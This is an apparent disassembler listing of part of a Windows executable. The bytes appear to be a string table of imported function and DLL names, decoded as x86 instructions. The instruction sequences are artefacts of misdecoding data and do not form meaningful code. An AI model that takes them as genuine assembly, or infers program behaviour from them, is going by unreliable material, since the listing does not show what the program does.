  42945c:	bound  ebp,QWORD PTR [edx+0x65]
  42945f:	arpl   WORD PTR [eax+eax*1+0x5d],si
  429463:	add    al,BYTE PTR [edi+0x65]
  429466:	je     0x4294bb
  429468:	jns    0x4294dd
  42946a:	je     0x4294d1
  42946c:	ins    DWORD PTR es:[edi],dx
  42946d:	push   esp
  42946e:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  429475:	jae    0x4294eb
  429477:	ins    DWORD PTR es:[edi],dx
  429478:	outs   dx,BYTE PTR gs:[esi]
  42947a:	je     0x42947c
  42947c:	add    al,0x1
  42947e:	inc    esp
  42947f:	gs ins BYTE PTR es:[edi],dx
  429481:	gs je  0x4294e9
  429484:	inc    esi
  429485:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47024900
  42948d:	gs je  0x4294e3
  429490:	push   0x5074726f
  429495:	popa   
  429496:	je     0x429500
  429498:	dec    esi
  429499:	popa   
  42949a:	ins    DWORD PTR es:[edi],dx
  42949b:	gs inc ecx
  42949d:	add    BYTE PTR [edx],al
  42949f:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  4294a3:	gs je  0x42950b
  4294a6:	inc    ebx
  4294a7:	jb     0x429512
  4294a9:	je     0x429514
  4294ab:	arpl   WORD PTR [ecx+0x6c],sp
  4294ae:	push   ebx
  4294af:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4294b4:	outs   dx,BYTE PTR ds:[esi]
  4294b5:	add    bl,ah
  4294b7:	add    BYTE PTR [ebx+0x72],al
  4294ba:	gs popa 
  4294bc:	je     0x429523
  4294be:	dec    esi
  4294bf:	popa   
  4294c0:	ins    DWORD PTR es:[edi],dx
  4294c1:	gs fs push eax
  4294c4:	imul   esi,DWORD PTR [eax+0x65],0xd4000057
  4294cb:	add    cl,BYTE PTR [ecx+0x73]
  4294ce:	inc    edx
  4294cf:	popa   
  4294d0:	fs push edx
  4294d2:	gs popa 
  4294d4:	fs push eax
  4294d6:	je     0x42954a
  4294d8:	add    BYTE PTR [eax],al
  4294da:	jnp    0x4294de
  4294dc:	inc    edi
  4294dd:	gs je  0x429535
  4294e0:	jae    0x429547
  4294e2:	jb     0x429528
  4294e4:	gs popaw 
  4294e7:	jne    0x429555
  4294e9:	je     0x429537
  4294eb:	inc    ebx
  4294ec:	dec    ecx
  4294ed:	inc    esp
  4294ee:	add    BYTE PTR [eax],al
  4294f0:	inc    ebp
  4294f1:	add    al,BYTE PTR [edi+0x65]
  4294f4:	je     0x429546
  4294f6:	jb     0x429567
  4294f8:	arpl   WORD PTR [ecx+0x64],ax
  4294fb:	fs jb  0x429563
  4294fe:	jae    0x429573
  429500:	add    BYTE PTR [eax],al
  429502:	mov    BYTE PTR [ebx],0x52
  429505:	gs jae 0x42956d
  429508:	je     0x42954f
  42950a:	jbe    0x429571
  42950c:	outs   dx,BYTE PTR ds:[esi]
  42950d:	je     0x42950f
  42950f:	add    BYTE PTR [edx+0x656c4300],ch
  429515:	popa   
  429516:	jb     0x42955b
  429518:	outs   dx,DWORD PTR ds:[esi]
  429519:	ins    DWORD PTR es:[edi],dx
  42951a:	ins    DWORD PTR es:[edi],dx
  42951b:	inc    ebp
  42951c:	jb     0x429590
  42951e:	outs   dx,DWORD PTR ds:[esi]
  42951f:	jb     0x429521
  429521:	add    BYTE PTR [eax+0x61654802],bh
  429527:	jo     0x42957e
  429529:	outs   dx,BYTE PTR ds:[esi]
  42952a:	ins    BYTE PTR es:[edi],dx
  42952b:	outs   dx,DWORD PTR ds:[esi]
  42952c:	arpl   WORD PTR [ebx+0x0],bp
  42952f:	add    dh,ch
  429531:	add    edx,DWORD PTR [ebx+0x65]
  429534:	je     0x429579
  429536:	outs   dx,DWORD PTR ds:[esi]
  429537:	ins    DWORD PTR es:[edi],dx
  429538:	ins    DWORD PTR es:[edi],dx
  429539:	push   ebx
  42953a:	je     0x42959d
  42953c:	je     0x4295a3
  42953e:	add    BYTE PTR [eax],al
  429540:	out    dx,eax
  429541:	add    DWORD PTR [edi+0x65],eax
  429544:	je     0x42958c
  429546:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  42954e:	bound  esi,QWORD PTR [ebp+0x74]
  429551:	gs jae 0x429595
  429554:	add    BYTE PTR [eax],al
  429556:	sub    al,0x1
  429558:	inc    ebp
  429559:	outs   dx,BYTE PTR ds:[esi]
  42955a:	jne    0x4295c9
  42955c:	push   ebx
  42955d:	jns    0x4295d2
  42955f:	je     0x4295c6
  429561:	ins    DWORD PTR es:[edi],dx
  429562:	dec    esp
  429563:	outs   dx,DWORD PTR ds:[esi]
  429564:	arpl   WORD PTR [ecx+0x6c],sp
  429567:	gs jae 0x4295ab
  42956a:	add    BYTE PTR [eax],al
  42956c:	sub    eax,0x74655304
  429571:	dec    esp
  429572:	outs   dx,DWORD PTR ds:[esi]
  429573:	arpl   WORD PTR [ecx+0x6c],sp
  429576:	push   esp
  429577:	imul   ebp,DWORD PTR [ebp+0x65],0x1240000
  42957e:	inc    ebp
  42957f:	outs   dx,BYTE PTR ds:[esi]
  429580:	jne    0x4295ef
  429582:	push   edx
  429583:	gs jae 0x4295f5
  429586:	jne    0x4295fa
  429588:	arpl   WORD PTR [ebp+0x4e],sp
  42958b:	popa   
  42958c:	ins    DWORD PTR es:[edi],dx
  42958d:	gs jae 0x4295e7
  429590:	add    BYTE PTR [eax],al
  429592:	imul   eax,DWORD PTR [esp+edx*2],0x7246736c
  429599:	gs add BYTE PTR gs:[ebx],ah
  42959d:	add    al,0x53
  42959f:	gs je  0x4295e8
  4295a2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4295aa:	gs jb  0x4295ad
  4295ad:	add    BYTE PTR [edi+0x1],ch
  4295b0:	inc    esi
  4295b1:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  4295b8:	jne    0x42962c
  4295ba:	arpl   WORD PTR [ebp+0x41],sp
  4295bd:	add    BYTE PTR ds:0x6c654401,al
  4295c3:	gs je  0x42962b
  4295c6:	inc    esi
  4295c7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4701a400
  4295cf:	gs je  0x429615
  4295d2:	outs   dx,DWORD PTR ds:[esi]
  4295d3:	ins    DWORD PTR es:[edi],dx
  4295d4:	jo     0x42964b
  4295d6:	je     0x42963d
  4295d8:	jb     0x429628
  4295da:	popa   
  4295db:	ins    DWORD PTR es:[edi],dx
  4295dc:	gs inc ebp
  4295de:	js     0x429621
  4295e0:	add    BYTE PTR [eax],al
  4295e2:	cmp    BYTE PTR [ebx],al
  4295e4:	dec    ebp
  4295e5:	outs   dx,DWORD PTR ds:[esi]
  4295e6:	jbe    0x42964d
  4295e8:	inc    esi
  4295e9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52454b00
  4295f1:	dec    esi
  4295f2:	inc    ebp
  4295f3:	dec    esp
  4295f4:	xor    esi,DWORD PTR [edx]
  4295f6:	cs fs ins BYTE PTR es:[edi],dx
  4295f9:	ins    BYTE PTR es:[edi],dx
  4295fa:	add    BYTE PTR [eax],al
  4295fc:	add    BYTE PTR [eax],al
  4295fe:	add    BYTE PTR [eax],al
  429600:	and    al,BYTE PTR gs:[edx]
	...
  42961f:	add    BYTE PTR [ebx],bh
  429621:	xchg   esi,eax
  429622:	add    al,BYTE PTR [eax]
	...
  429630:	imul   esp,DWORD PTR fs:[edx+0x6f],0x632e6661
  429638:	outs   dx,DWORD PTR ds:[esi]
  429639:	ins    DWORD PTR es:[edi],dx
  42963a:	add    BYTE PTR [ebx+0x72],al
  42963d:	je     0x429693
  42963f:	push   0x64616572
  429644:	inc    ebp
  429645:	js     0x429688
  429647:	inc    eax
  429648:	cmp    BYTE PTR [eax],al
